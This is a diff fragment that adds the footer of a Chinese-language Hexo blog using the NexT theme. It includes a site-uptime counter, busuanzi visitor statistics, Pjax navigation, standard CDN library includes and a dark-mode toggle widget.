+        var grt= new Date("11/3/2022 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已存活 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+<script src="https://unpkg.com/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.3s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#FFFFE0',
+  buttonColorLight: '#00BFFF',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+<div class="moon-menu">
+  <div class="moon-menu-items">
+    
+    <div id="moon-menu-item-back2bottom" class="moon-menu-item">
+      <i class='fas fa-chevron-down'></i>    </div>
+    
+    <div id="moon-menu-item-back2top" class="moon-menu-item">
+      <i class='fas fa-chevron-up'></i>    </div>
+    
+  </div>
+  <div class="moon-menu-button">
+    <svg class="moon-menu-bg">
+      <circle class="moon-menu-cricle" cx="50%" cy="50%" r="44%"></circle>
+      <circle class="moon-menu-border" cx="50%" cy="50%" r="48%"></circle>
+    </svg>
+    <div class="moon-menu-content">
+      <div class="moon-menu-icon"><i class='fas fa-ellipsis-v'></i></div>
+      <div class="moon-menu-text"></div>
+    </div>
+  </div>
+</div><script src="/js/injector.js"></script>
+    </div>
+</body>
+</html>
+
+
